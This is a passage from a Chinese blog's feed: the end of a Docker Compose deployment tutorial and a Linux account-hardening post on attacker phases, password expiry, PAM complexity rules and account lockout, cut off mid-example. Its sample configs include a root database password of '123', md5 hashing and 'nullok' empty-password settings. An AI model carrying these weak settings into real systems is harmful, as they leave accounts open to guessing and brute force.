    error_page   <span class="token number">500</span> <span class="token number">502</span> <span class="token number">503</span> <span class="token number">504</span>  /50x.html<span class="token punctuation">;</span>        location <span class="token operator">=</span> /50x.html <span class="token punctuation">{</span>            root   html<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        location /api <span class="token punctuation">{</span>            rewrite /api/<span class="token punctuation">(</span>.*<span class="token punctuation">)</span>  /<span class="token variable">$1</span> <span class="token builtin class-name">break</span><span class="token punctuation">;</span>            proxy_pass http://hmall:8080<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    server <span class="token punctuation">{</span>        listen       <span class="token number">18081</span><span class="token punctuation">;</span>        <span class="token comment"># 指定前端项目所在的位置</span>        location / <span class="token punctuation">{</span>            root /usr/share/nginx/html/hmall-admin<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        error_page   <span class="token number">500</span> <span class="token number">502</span> <span class="token number">503</span> <span class="token number">504</span>  /50x.html<span class="token punctuation">;</span>        location <span class="token operator">=</span> /50x.html <span class="token punctuation">{</span>            root   html<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        location /api <span class="token punctuation">{</span>            rewrite /api/<span class="token punctuation">(</span>.*<span class="token punctuation">)</span>  /<span class="token variable">$1</span> <span class="token builtin class-name">break</span><span class="token punctuation">;</span>            proxy_pass http://hmall:8080<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8-4-测试访问"><a href="#8-4-测试访问" class="headerlink" title="8.4 测试访问"></a>8.4 测试访问</h2><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2011.06.33.png" style="zoom:50%;"><p>大功告成🎉。</p><h1 id="九、DockerCompose"><a href="#九、DockerCompose" class="headerlink" title="九、DockerCompose"></a>九、DockerCompose</h1><p>Docker Compose通过一个单独的<strong>docker-compose.yml</strong> 模板文件（YAML 格式）来定义一组相关联的应用容器，帮助我们实现多个相互关联的Docker容器的快速部署。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-19%2017.57.59.png" style="zoom:50%;"><p>docker run和DockerCompose具有一定的对应关系。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-19%2017.59.45.png" style="zoom:50%;"><p><strong>docker compose</strong>的命令格式如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> compose <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> <span class="token punctuation">[</span>COMMAND<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th><strong>类型</strong></th><th><strong>参数或指令</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>Options</td><td>-f</td><td>指定compose文件的路径和名称</td></tr><tr><td>Options</td><td>-p</td><td>指定project名称</td></tr><tr><td>Commands</td><td>up</td><td>创建并启动所有service容器</td></tr><tr><td>Commands</td><td>down</td><td>停止并移除所有容器、网络</td></tr><tr><td>Commands</td><td>ps</td><td>列出所有启动的容器</td></tr><tr><td>Commands</td><td>logs</td><td>查看指定容器的日志</td></tr><tr><td>Commands</td><td>stop</td><td>停止容器</td></tr><tr><td>Commands</td><td>start</td><td>启动容器</td></tr><tr><td>Commands</td><td>restart</td><td>重启容器</td></tr><tr><td>Commands</td><td>top</td><td>查看运行的进程</td></tr><tr><td>Commands</td><td>exec</td><td>在指定的运行中容器中执行命令</td></tr></tbody></table><p>通过dockerCompose部署应用的yml文件：docker-compose.yml</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">"3.8"</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">mysql</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> mysql    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> mysql    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"3306:3306"</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token key atrule">TZ</span><span class="token punctuation">:</span> Asia/Shanghai      <span class="token key atrule">MYSQL_ROOT_PASSWORD</span><span class="token punctuation">:</span> <span class="token number">123</span>    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"./mysql/conf:/etc/mysql/conf.d"</span>      <span class="token punctuation">-</span> <span class="token string">"./mysql/data:/var/lib/mysql"</span>      <span class="token punctuation">-</span> <span class="token string">"./mysql/init:/docker-entrypoint-initdb.d"</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> hm<span class="token punctuation">-</span>net  <span class="token key atrule">hmall</span><span class="token punctuation">:</span>    <span class="token key atrule">build</span><span class="token punctuation">:</span>       <span class="token key atrule">context</span><span class="token punctuation">:</span> .      <span class="token key atrule">dockerfile</span><span class="token punctuation">:</span> Dockerfile    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> hmall    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"8080:8080"</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> hm<span class="token punctuation">-</span>net    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> mysql  <span class="token key atrule">nginx</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> nginx    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> nginx    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"18080:18080"</span>      <span class="token punctuation">-</span> <span class="token string">"18081:18081"</span>    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"./nginx/nginx.conf:/etc/nginx/nginx.conf"</span>      <span class="token punctuation">-</span> <span class="token string">"./nginx/html:/usr/share/nginx/html"</span>    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> hmall    <span class="token key atrule">networks</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> hm<span class="token punctuation">-</span>net<span class="token key atrule">networks</span><span class="token punctuation">:</span>  <span class="token key atrule">hm-net</span><span class="token punctuation">:</span>    <span class="token key atrule">name</span><span class="token punctuation">:</span> hmall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点关注各类路径问题。</p><blockquote><p>Docker Compose 文件中的 <code>version</code> 字段用于指定使用的 Compose 文件格式版本。这个字段对于确保你的 Compose 文件能够被 Docker Compose 正确解析非常重要，因为不同版本的 Compose 支持不同的语法和特性。</p></blockquote><p>将之前的容器/镜像全都删除之后，创建一个新的目录，目录内容：</p><p>还需要注意一下Dockerfile中构建的镜像是之前idea打好的jar包——hm-service.jar。</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-19%2018.12.54.png" alt="截屏2024-12-19 18.12.54"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> compose <span class="token parameter variable">-p</span> heimamall  up  <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-19%2018.17.37.png" style="zoom:50%;"><p>dps查看容器：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-19%2018.17.49.png" alt="截屏2024-12-19 18.17.49" style="zoom:50%;"><p>访问测试：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-19%2018.18.48.png" style="zoom:50%;"><p>docker compose一键部署成功。</p><p>删除项目：</p><pre class="line-numbers language-none"><code class="language-none">docker compose -p heimamall  down<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-19%2018.27.57.png" alt="截屏2024-12-19 18.27.57"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://b11et3un53m.feishu.cn/wiki/Rfocw7ctXij2RBkShcucLZbrn2d">https://b11et3un53m.feishu.cn/wiki/Rfocw7ctXij2RBkShcucLZbrn2d</a> </p><p><a href="https://www.cnblogs.com/dakewei/p/10831125.html">https://www.cnblogs.com/dakewei/p/10831125.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 虚拟化技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟化技术 </tag>
            
            <tag> 容器化技术 </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux安全加固之账户安全加固</title>
      <link href="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/"/>
      <url>/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/</url>
      
        <content type="html"><![CDATA[<h1 id="一、账号安全的重要性"><a href="#一、账号安全的重要性" class="headerlink" title="一、账号安全的重要性"></a>一、账号安全的重要性</h1><p>在当今很多网络系统都以用户名(帐号)和口令作为鉴权方式，口令的重要性就可想而知了。口令就相当手进入家门的钥匙，当他人有一把可以进入你家的钥匙，想想你的安全、你的财物、你的隐私。。。害怕了吧。因为弱口令很容易被他人猜到或破解，所以如果你使用弱口令，就像把家门钥匙放在家门口的垫子下面，是非常危险的。</p><p>一般攻击者的渗透过程都会经过如下几个阶段：</p><ul><li>扫描探测=&gt;渗透攻击=&gt;攻陷入侵=&gt;恶意行为。</li></ul><h2 id="1-1-扫描探测"><a href="#1-1-扫描探测" class="headerlink" title="1.1 扫描探测"></a>1.1 扫描探测</h2><p>扫描探测：攻击者在攻击前的对目标的扫描，包括网络扫描、系统扫描、端口、漏洞扫描等，扫描行为是攻击入侵的前期准备阶段，通过信息收集，掌握目标机器的系统，漏洞信息，对进一步进行入侵攻击有事半功倍的效果。</p><ul><li>如使用netdiscover/nmap等工具</li></ul><img src="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/%E6%88%AA%E5%B1%8F2024-12-11%2013.31.32.png" style="zoom:50%;"><h2 id="1-2-渗透攻击"><a href="#1-2-渗透攻击" class="headerlink" title="1.2 渗透攻击"></a>1.2 渗透攻击</h2><p>该阶段是已经对目标机器做了扫描，或是直接对目标机器进行攻击，包括利用系统栈堆方面的漏洞，利用Web系统平台方面的漏洞，逻辑配置错误方面的漏洞，内存破坏方面的漏洞等，对目标主机发起攻击。</p><ul><li>如使用hydra进行口令爆破</li></ul><img src="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/%E6%88%AA%E5%B1%8F2024-12-11%2013.35.27.png" style="zoom:40%;"><h2 id="1-3-攻陷入侵"><a href="#1-3-攻陷入侵" class="headerlink" title="1.3 攻陷入侵"></a>1.3 攻陷入侵</h2><p>该阶段表示了目标主机已经被黑客成功攻陷，接下来攻击者可以做他想做的事情，攻陷阶段的表现形式比如，SSH登录成功，FTP登录成功。</p><ul><li>如下，通过hydra成功爆破出ssh的账号密码，然后进行登录。</li></ul><img src="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/%E6%88%AA%E5%B1%8F2024-12-11%2013.37.02.png" style="zoom:50%;"><h2 id="1-4-恶意行为"><a href="#1-4-恶意行为" class="headerlink" title="1.4 恶意行为"></a>1.4 恶意行为</h2><p>攻击者在目标主机可能进行删库，修改配置文件，下载数据库文件或者安装完恶意软件后进行对主机进行恶意操作等。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>通过上述示例，我们可以了解到如果账户和口令安全性较低会大大增加被攻陷入侵的可能性，因此账号口令安全加固的重要性不言而喻。</p><p>一般而言，一种常见的加固思路比如：修改用户口令有效机制，用户离开工作岗位一段时间后，其账户自动失效，就算管理员忘记删除该账户，该账户也不会给系统带来危害。</p><h1 id="二、账户期限加固"><a href="#二、账户期限加固" class="headerlink" title="二、账户期限加固"></a>二、账户期限加固</h1><h2 id="2-1-etc-login-defs文件"><a href="#2-1-etc-login-defs文件" class="headerlink" title="2.1 /etc/login.defs文件"></a>2.1 /etc/login.defs文件</h2><p><code>/etc/login.defs</code> 是一个系统配置文件，它包含了许多与用户账户和密码相关的配置选项。在类 Unix 系统中，这个文件定义了系统级的用户账户和密码管理的默认值和限制。不同的系统和发行版可能会有不同的配置选项，但以下是一些常见的配置项：</p><ol><li><strong>PASS_MAX_DAYS</strong>：密码的最大有效天数。</li><li><strong>PASS_MIN_DAYS</strong>：密码的最小有效天数。</li><li><strong>PASS_WARN_AGE</strong>：在密码过期前多少天开始警告用户。</li><li><strong>ENCRYPT_METHOD</strong>：密码加密的方法。</li><li><strong>UID_MIN</strong> 和 <strong>UID_MAX</strong>：系统用户和组的最小和最大用户ID。</li><li><strong>GID_MIN</strong> 和 <strong>GID_MAX</strong>：系统组的最小和最大组ID。</li><li><strong>CREATE_HOME</strong>：当创建新用户时是否创建家目录。</li><li><strong>UMASK</strong>：新文件的默认权限掩码。</li><li><strong>USERGROUPS_ENAB</strong>：是否允许用户属于多个组。</li><li><strong>MAIL_DIR</strong>：用户的邮件目录。</li><li><strong>MAIL_FILE</strong>：用户的邮件文件。</li><li><strong>SU_NAME</strong>：默认的超级用户名称。</li></ol><p>修改 <code>/etc/login.defs</code> 文件可以改变这些默认值，但通常需要管理员权限。在修改此文件时应该非常小心，因为错误的配置可能会导致安全问题或系统功能不正常。在编辑文件后，通常需要重新启动相关的服务或者系统，以使更改生效。对于大多数更改，你可能需要重新启动 <code>pam</code>（可插拔认证模块）服务或者重启系统。</p><img src="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/%E6%88%AA%E5%B1%8F2024-12-11%2014.01.46.png" style="zoom:30%;"><p>通常要修改下面两个个字段：</p><ol><li><strong>PASS_MAX_DAYS</strong>：密码的最大有效天数。</li><li><strong>PASS_WARN_AGE</strong>：在密码过期前多少天开始警告用户。</li></ol><h2 id="2-2-etc-default-useradd文件"><a href="#2-2-etc-default-useradd文件" class="headerlink" title="2.2  /etc/default/useradd文件"></a>2.2  /etc/default/useradd文件</h2><p>在 <code>/etc/default/useradd</code> 文件中，<code>INACTIVE</code> 和 <code>EXPIRE</code> 是两个与用户账户过期相关的配置项：</p><ol><li><strong>INACTIVE</strong>：这个配置项用来设置密码过期后账户被禁用之前的天数。如果 <code>INACTIVE</code> 设置为 <code>-1</code>，则表示账户不会因密码过期而被禁用，这是默认值。如果设置为其他值，比如 <code>30</code>，则表示如果用户在密码过期后30天内没有更新密码，账户将被禁用。</li><li><strong>EXPIRE</strong>：这个配置项用来设置账户的过期日期。如果设置了 <code>EXPIRE</code>，那么账户将在指定的日期后过期。日期格式通常是 <code>MM/DD/YY</code> 或 <code>YYYY-MM-DD</code>。如果没有设置 <code>EXPIRE</code> 或者留空，那么账户将不会过期。</li></ol><p>例如，如果你想要设置一个新用户的账户在密码过期后7天内被禁用，以及账户在2024年12月31日过期，你可以在 <code>/etc/default/useradd</code> 文件中设置如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">INACTIVE</span><span class="token operator">=</span><span class="token number">7</span><span class="token assign-left variable">EXPIRE</span><span class="token operator">=</span><span class="token number">2024</span>-12-31<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样，任何新添加的用户都将遵循这些默认设置。需要注意的是，这些设置只影响新添加的用户，对于已经存在的用户，需要使用 <code>usermod</code> 命令单独设置。</p><img src="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/%E6%88%AA%E5%B1%8F2024-12-11%2014.06.48.png" style="zoom:30%;"><h1 id="三、账号密码策略加固"><a href="#三、账号密码策略加固" class="headerlink" title="三、账号密码策略加固"></a>三、账号密码策略加固</h1><h2 id="3-1-密码复杂度加固"><a href="#3-1-密码复杂度加固" class="headerlink" title="3.1 密码复杂度加固"></a>3.1 密码复杂度加固</h2><h3 id="3-1-1-etc-pam-d-system-auth简介"><a href="#3-1-1-etc-pam-d-system-auth简介" class="headerlink" title="3.1.1 /etc/pam.d/system-auth简介"></a>3.1.1 /etc/pam.d/system-auth简介</h3><p><code>/etc/pam.d/system-auth</code> 是一个非常重要的配置文件，它位于 Linux 系统中，用于定义用户认证的行为。PAM（Pluggable Authentication Modules）是一个动态链接库和一组应用程序接口（API），它们允许将多个认证机制集成到系统中的应用程序中。<code>system-auth</code> 文件通常用于处理系统的认证任务，如登录、密码更改等。</p><h3 id="3-1-2-配置文件结构"><a href="#3-1-2-配置文件结构" class="headerlink" title="3.1.2 配置文件结构"></a>3.1.2 配置文件结构</h3><p><code>/etc/pam.d/system-auth</code> 文件包含一系列的模块条目，每个条目都指定了如何处理特定的认证请求。这些条目通常包括以下字段：</p><ol><li><strong>控制标志</strong>：如 <code>auth</code>, <code>account</code>, <code>password</code>, <code>session</code>，它们指定了 PAM 模块的类型。</li><li><strong>PAM 模块路径</strong>：模块的完整路径，如 <code>pam_unix.so</code>。</li><li><strong>模块选项</strong>：传递给 PAM 模块的参数。</li><li><strong>模块参数</strong>：可选的，传递给 PAM 模块的额外参数。</li></ol><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#%PAM-1.0</span>auth        required      pam_env.soauth        sufficient    pam_unix.so nullok try_first_passauth        <span class="token punctuation">[</span>default<span class="token operator">=</span>die<span class="token punctuation">]</span> pam_faillock.so preauth silent audit <span class="token assign-left variable">deny</span><span class="token operator">=</span><span class="token number">5</span> <span class="token assign-left variable">unlock_time</span><span class="token operator">=</span><span class="token number">900</span>auth        sufficient    pam_succeed_if.so uid <span class="token operator">&gt;=</span> <span class="token number">1000</span> quietauth        required      pam_deny.soaccount     required      pam_access.soaccount     required      pam_unix.so broken_shadowaccount     <span class="token punctuation">[</span>default<span class="token operator">=</span>bad <span class="token assign-left variable">success</span><span class="token operator">=</span>ok <span class="token assign-left variable">user_unknown</span><span class="token operator">=</span>ignore<span class="token punctuation">]</span> pam_succeed_if.so quietpassword    requisite    pam_pwquality.so <span class="token assign-left variable">retry</span><span class="token operator">=</span><span class="token number">3</span>password    sufficient    pam_unix.so md5 shadow use_authtok try_first_passpassword    <span class="token punctuation">[</span>default<span class="token operator">=</span>die<span class="token punctuation">]</span> pam_faillock.so authfail audit <span class="token assign-left variable">deny</span><span class="token operator">=</span><span class="token number">5</span> <span class="token assign-left variable">unlock_time</span><span class="token operator">=</span><span class="token number">900</span>password    <span class="token punctuation">[</span>default<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">]</span> pam_faillock.so authsucc audit <span class="token assign-left variable">deny</span><span class="token operator">=</span><span class="token number">5</span> <span class="token assign-left variable">unlock_time</span><span class="token operator">=</span><span class="token number">900</span>password    sufficient    pam_deny.sosession     optional      pam_keyinit.so force revokesession     required      pam_limits.sosession     <span class="token punctuation">[</span>default<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">]</span>   pam_succeed_if.so <span class="token function">service</span> <span class="token keyword">in</span> crond quiet use_uidsession     sufficient    pam_unix.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li>ubuntu系统没有/etc/pam.d/system-auth文件？【/etc/pam.d/common-password】</li></ul><p>在Ubuntu系统中，<code>/etc/pam.d/system-auth</code> 文件可能不存在，这是因为Ubuntu使用的是不同的文件来处理PAM（Pluggable Authentication Modules）配置。Ubuntu系统中与密码设置及登录控制相关的文件通常是 <code>/etc/pam.d/common-password</code>。这是因为Ubuntu和其他基于Debian的系统使用 <code>/etc/pam.d/common-password</code> 作为密码认证的通用配置文件，而不是像一些基于Red Hat的系统那样使用 <code>/etc/pam.d/system-auth</code> 文件。</p><p>因此，如果你在Ubuntu系统中寻找类似于 <code>/etc/pam.d/system-auth</code> 的配置文件，你应该查看 <code>/etc/pam.d/common-password</code> 文件，以及其他可能的 <code>/etc/pam.d/</code> 目录下的文件，如 <code>/etc/pam.d/common-auth</code> 等，这些文件共同定义了Ubuntu系统的认证和账户管理策略。</p></blockquote><h3 id="3-1-3-密码复杂度设置"><a href="#3-1-3-密码复杂度设置" class="headerlink" title="3.1.3 密码复杂度设置"></a>3.1.3 密码复杂度设置</h3><p>要设置密码复杂度，你需要编辑 <code>/etc/pam.d/common-password</code> 文件，并找到包含 <code>pam_pwquality.so</code> 或 <code>pam_cracklib.so</code> 的行，然后添加或修改上述参数。例如，以下配置要求密码至少12个字符长，至少包含一个大写字母、一个小写字母、一个数字和一个特殊字符，并且root用户也必须遵守这些规则：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">password    requisite     pam_pwquality.so try_first_pass local_users_only <span class="token assign-left variable">retry</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">authtok_type</span><span class="token operator">=</span> <span class="token assign-left variable">minlen</span><span class="token operator">=</span><span class="token number">12</span> <span class="token assign-left variable">lcredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">ucredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">dcredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">ocredit</span><span class="token operator">=</span>-1 enforce_for_root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">minlen</span><span class="token operator">=</span>N：设置密码的最小长度。例如，minlen<span class="token operator">=</span><span class="token number">12</span> 表示密码至少需要12个字符。<span class="token assign-left variable">dcredit</span><span class="token operator">=</span>N：控制密码中数字的出现次数。当N<span class="token operator">&gt;</span><span class="token number">0</span>时，表示新密码中数字出现的最大次数；当N<span class="token operator">&lt;</span><span class="token number">0</span>时，表示新密码中数字出现的最少次数。例如，dcredit<span class="token operator">=</span>-1 表示密码至少包含一个数字。<span class="token assign-left variable">ucredit</span><span class="token operator">=</span>N：控制密码中大写字母的出现次数。规则与 dcredit 相同。ucredit<span class="token operator">=</span>-1 表示密码至少包含一个大写字母。<span class="token assign-left variable">lcredit</span><span class="token operator">=</span>N：控制密码中小写字母的出现次数。规则与 dcredit 相同。lcredit<span class="token operator">=</span>-1 表示密码至少包含一个小写字母。<span class="token assign-left variable">ocredit</span><span class="token operator">=</span>N：控制密码中特殊字符的出现次数。规则与 dcredit 相同。ocredit<span class="token operator">=</span>-1 表示密码至少包含一个特殊字符。<span class="token assign-left variable">retry</span><span class="token operator">=</span>N：定义用户在密码失败后可以重试的次数。例如，retry<span class="token operator">=</span><span class="token number">3</span> 允许用户在密码输入错误后重试3次。<span class="token assign-left variable">difok</span><span class="token operator">=</span>N：新密码与旧密码至少不同的字符数。例如，difok<span class="token operator">=</span><span class="token number">3</span> 表示新密码必须与旧密码至少有3个字符不同。enforce_for_root：即使是root用户设置密码，也应强制执行复杂性策略。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者，如果你使用的是 <code>pam_cracklib.so</code> 模块，配置可能如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">password requisite pam_cracklib.so <span class="token assign-left variable">retry</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">minlen</span><span class="token operator">=</span><span class="token number">12</span> <span class="token assign-left variable">difok</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">ucredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">lcredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">dcredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">ocredit</span><span class="token operator">=</span>-1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在进行这些更改后，为了使配置生效，你可能需要重新启动相关的服务或者系统。请记得在修改系统文件之前备份原始文件，以便在出现问题时可以恢复。</p><h2 id="3-2-其他密码策略的配置"><a href="#3-2-其他密码策略的配置" class="headerlink" title="3.2 其他密码策略的配置"></a>3.2 其他密码策略的配置</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auth required pam_tally2.so <span class="token assign-left variable">deny</span><span class="token operator">=</span><span class="token number">6</span> <span class="token assign-left variable">unlock_time</span><span class="token operator">=</span><span class="token number">300</span> even_deny_root <span class="token assign-left variable">root_unlock_time</span><span class="token operator">=</span><span class="token number">60</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>pam_tally2.so</code>：这是一个账户锁定模块，用于防止暴力破解攻击。</li><li><code>deny=6</code>：如果用户连续6次输入错误的密码，账户将被锁定。</li><li><code>unlock_time=300</code>：账户锁定后，将在300秒（5分钟）后自动解锁。</li><li><code>even_deny_root</code>：这个选项意味着即使是root用户，也会受到账户锁定的限制。</li><li><code>root_unlock_time=60</code>：对于root用户，账户锁定时间是60秒。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">password requisite pam_cracklib.so try_first_pass <span class="token assign-left variable">retry</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">dcredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">lcredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">ucredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">ocredit</span><span class="token operator">=</span>-1 <span class="token assign-left variable">minclass</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">minlen</span><span class="token operator">=</span><span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>pam_cracklib.so</code>：另一个用于检查密码质量的模块。</li><li><code>try_first_pass</code>：尝试使用前一阶段的密码。当这个选项被设置时，PAM模块会尝试使用在认证阶段（通常是用户登录时）已经输入的密码，而不是要求用户再次输入密码。这意味着如果用户在登录时输入了密码，这个密码会被“记住”，并在需要时用于密码更改操作。</li><li><code>retry=3</code>：用户可以重试3次。</li><li><code>dcredit=-1</code>：密码至少包含一个数字。</li><li><code>lcredit=-1</code>：密码至少包含一个小写字母。</li><li><code>ucredit=-1</code>：密码至少包含一个大写字母。</li><li><code>ocredit=-1</code>：密码至少包含一个特殊字符。</li><li><code>minclass=3</code>：密码至少包含三种不同类型的字符。</li><li><code>minlen=8</code>：密码的最小长度为8个字符。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">password sufficient pam_unix.so sha512 shadow nullok try_first_pass use_authtok <span class="token assign-left variable">remember</span><span class="token operator">=</span><span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>pam_unix.so</code>：使用SHA-512算法来加密密码。</li><li><code>shadow</code>：使用影子密码文件。</li><li><code>nullok</code>：允许空密码。</li><li><code>try_first_pass</code>：尝试使用前一阶段的密码。</li><li><code>use_authtok</code>：使用认证阶段的密码。</li><li><code>remember=5</code>：记住用户最近使用的5个密码，防止用户重复使用旧密码。</li></ul><h1 id="四、登录控制"><a href="#四、登录控制" class="headerlink" title="四、登录控制"></a>四、登录控制</h1><h2 id="4-1-禁止除root以外的所有用户登录"><a href="#4-1-禁止除root以外的所有用户登录" class="headerlink" title="4.1 禁止除root以外的所有用户登录"></a>4.1 禁止除root以外的所有用户登录</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span> /etc/nologin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p><strong>阻止普通用户登录</strong>：当 <code>/etc/nologin</code> 文件存在时，除了 root 用户之外的所有用户在尝试登录时都会收到一条消息，通常是 “/etc/nologin: Permission denied” 或者文件中定义的消息，并且登录尝试会被拒绝。这可以用于系统维护或在系统更新期间防止用户登录。</p></li><li><p><strong>自定义登录消息</strong>：你可以在 <code>/etc/nologin</code> 文件中添加自定义消息，这样当用户尝试登录时，他们会看到这条消息而不是默认的拒绝消息。这可以用来通知用户系统维护的时间或者为什么他们不能登录。</p></li><li><p><strong>系统维护</strong>：在系统需要进行维护或更新时，创建 <code>/etc/nologin</code> 文件是一种快速通知所有用户系统暂时不可用的方法。</p></li></ol><p>例如：</p><pre class="line-numbers language-bash" data-language="bash"><code 